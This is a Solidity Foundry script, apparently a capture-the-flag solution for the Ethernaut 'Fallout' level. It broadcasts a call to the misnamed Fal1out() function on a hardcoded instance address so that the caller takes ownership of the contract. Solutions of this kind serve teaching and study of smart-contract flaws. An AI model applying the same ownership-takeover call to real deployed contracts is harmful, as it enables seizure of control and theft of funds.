// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/2_IFallout.sol";

address constant INSTANCE = 0x5eb790b8dE9C31944d8AF4a2f4DdBa32030Dc203;

contract FalloutPOCScript is Script {
    IFallout instance = IFallout(INSTANCE);

    function run() external {
        vm.startBroadcast();

        instance.Fal1out();

        vm.stopBroadcast();
    }
}